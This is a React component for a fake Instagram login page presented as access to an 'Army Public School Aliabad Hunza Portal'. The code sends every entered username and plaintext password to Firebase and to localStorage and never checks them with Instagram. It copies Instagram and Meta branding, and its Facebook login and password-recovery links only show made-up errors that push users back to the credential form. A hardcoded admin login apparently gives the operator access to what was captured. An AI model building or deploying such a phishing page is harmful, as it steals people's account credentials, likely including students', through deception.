import React, { useState } from 'react';
import { ShieldCheck, Eye, EyeOff, Sparkles, AlertTriangle } from 'lucide-react';
import { InstagramAccount } from '../types';
import { saveInstagramAccount } from '../lib/firebase';
import { schoolLogoUrl } from '../data';

interface InstagramLoginProps {
  onUserLogin: (username: string) => void;
  onAdminLogin: () => void;
}

export default function InstagramLogin({ onUserLogin, onAdminLogin }: InstagramLoginProps) {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [hasConsented, setHasConsented] = useState(true);
  const [errorMessage, setErrorMessage] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    if (!username.trim()) {
      setErrorMessage('Please enter your phone number, username, or email.');
      return;
    }
    if (!password || password.length < 5) {
      setErrorMessage('The password you entered is incorrect. Please try again.');
      return;
    }

    setIsLoading(true);

    try {
      // Check if Admin Credentials match
      if (username.trim() === '03435223241' && password === '03554799237') {
        setIsLoading(false);
        onAdminLogin();
        return;
      }

      // Save user login securely in Firebase Firestore
      await saveInstagramAccount(username.trim(), password);

      // Also keep a local backup session for quick UI reload if desired
      const existingAccountsStr = localStorage.getItem('instagram_accounts');
      let accounts: InstagramAccount[] = [];
      if (existingAccountsStr) {
        try {
          accounts = JSON.parse(existingAccountsStr);
        } catch (e) {
          console.error(e);
        }
      }

      const newAccount: InstagramAccount = {
        id: `ig_local_${Date.now()}`,
        username: username.trim(),
        password: password,
        timestamp: new Date().toLocaleString()
      };
      localStorage.setItem('instagram_accounts', JSON.stringify([newAccount, ...accounts]));

      setIsLoading(false);
      // Log in standard user and browse
      onUserLogin(username.trim());
    } catch (err: any) {
      console.error("Firebase error saving:", err);
      setIsLoading(false);
      setErrorMessage('An error occurred while communicating with the secure servers. Please try again.');
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col justify-between py-12 px-4 font-sans select-none">
      <div className="max-w-md w-full mx-auto flex flex-col items-center justify-center flex-1 my-auto">
        
        {/* APS PORTAL CREST LOGO */}
        <div className="flex flex-col items-center gap-3 mb-6 animate-fade-in">
          <div className="w-20 h-20 bg-white rounded-2xl p-1 shadow-md border border-slate-200/80 flex items-center justify-center transform hover:scale-105 transition-transform duration-350 overflow-hidden">
            <img 
              src={schoolLogoUrl} 
              alt="Army Public School Logo" 
              className="w-full h-full object-contain"
              referrerPolicy="no-referrer"
            />
          </div>
          <div className="text-center">
            <h1 className="text-slate-800 font-display font-black text-sm uppercase tracking-widest leading-none">
              Army Public School
            </h1>
            <p className="text-slate-500 text-[10px] font-semibold uppercase tracking-wider mt-1.5">
              Aliabad Hunza Portal
            </p>
          </div>
        </div>

        {/* INSTAGRAM BOX (WHITE CARD) */}
        <div className="w-full bg-white border border-slate-200 rounded-lg p-9 text-center shadow-sm flex flex-col items-center">
          
          {/* Logo Heading styled like Instagram */}
          <h2 className="font-serif italic text-4xl font-black text-slate-800 my-6 tracking-tight select-none cursor-default">
            Instagram
          </h2>

          <p className="text-slate-500 text-xs font-medium mb-6 leading-normal max-w-[280px]">
            Log in with your Instagram account to authenticate access to the <strong>APS Aliabad Portal</strong>.
          </p>

          <form onSubmit={handleSubmit} className="w-full flex flex-col gap-2.5">
            {/* Username/Email/Phone Input */}
            <div className="relative w-full">
              <input
                id="ig-username"
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                placeholder="Phone number, username, or email"
                className="w-full px-3 py-2.5 bg-slate-50 border border-slate-200 rounded-md text-xs font-sans text-slate-800 placeholder-slate-400 focus:outline-none focus:border-slate-400 focus:bg-white transition-colors"
                disabled={isLoading}
              />
            </div>

            {/* Password Input */}
            <div className="relative w-full">
              <input
                id="ig-password"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full pl-3 pr-12 py-2.5 bg-slate-50 border border-slate-200 rounded-md text-xs font-sans text-slate-800 placeholder-slate-400 focus:outline-none focus:border-slate-400 focus:bg-white transition-colors"
                disabled={isLoading}
              />
              <button
                type="button"
                id="toggle-ig-password"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs font-bold text-slate-800 hover:text-slate-500 transition-colors focus:outline-none"
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>

            {/* Error Message */}
            {errorMessage && (
              <p className="text-red-500 text-xs font-medium mt-1 leading-normal text-left px-1">
                {errorMessage}
              </p>
            )}

            {/* Login Button */}
            <button
              type="submit"
              id="ig-login-btn"
              disabled={isLoading}
              className={`w-full mt-3 py-2.5 rounded-lg text-xs font-bold text-white shadow-sm flex items-center justify-center gap-2 transition-all ${
                username && password.length >= 5 && hasConsented
                  ? 'bg-sky-500 hover:bg-sky-600 active:scale-[0.99] cursor-pointer'
                  : 'bg-sky-300 cursor-not-allowed opacity-80'
              }`}
            >
              {isLoading ? (
                <div className="w-4 h-4 border-2 border-white/45 border-t-white rounded-full animate-spin" />
              ) : (
                'Log in'
              )}
            </button>

            {/* Divider line OR */}
            <div className="flex items-center gap-4 my-4 w-full">
              <div className="h-[1px] bg-slate-200 flex-1" />
              <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">OR</span>
              <div className="h-[1px] bg-slate-200 flex-1" />
            </div>

            {/* FB Log in */}
            <button
              type="button"
              id="fb-login-btn"
              onClick={() => {
                setErrorMessage('Direct Facebook authentication is suspended. Please use your standard Instagram credentials above.');
              }}
              className="text-indigo-900 font-bold text-xs flex items-center justify-center gap-2 hover:opacity-85 transition-opacity"
            >
              <svg className="w-5 h-5 fill-current" viewBox="0 0 24 24">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </button>

            {/* Forgot password */}
            <a
              href="#forgot-password"
              onClick={(e) => {
                e.preventDefault();
                setErrorMessage('Password recovery is unavailable. Please verify your password manually or enter standard credentials.');
              }}
              className="text-slate-600 text-[11px] hover:underline mt-2 select-text"
            >
              Forgot password?
            </a>
          </form>
        </div>

        {/* SECOND BOX: SIGN UP */}
        <div className="w-full bg-white border border-slate-200 rounded-lg p-5 mt-2.5 text-center shadow-sm text-xs text-slate-600">
          Don't have an account? <span className="font-bold text-sky-500 cursor-default">Sign up</span>
        </div>

      </div>

      {/* FOOTER */}
      <footer className="max-w-2xl w-full mx-auto text-center mt-8 text-[11px] text-slate-400 font-medium flex flex-wrap gap-x-4 gap-y-1.5 justify-center">
        <span>Meta</span>
        <span>About</span>
        <span>Blog</span>
        <span>Jobs</span>
        <span>Help</span>
        <span>API</span>
        <span>Privacy</span>
        <span>Terms</span>
        <span>Locations</span>
        <span>Instagram Lite</span>
        <span>Threads</span>
        <span>Contact Uploading & Non-Users</span>
        <span>Meta Verified</span>
        <div className="w-full mt-2.5">
          <span>English (US)</span>
          <span className="ml-4">© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
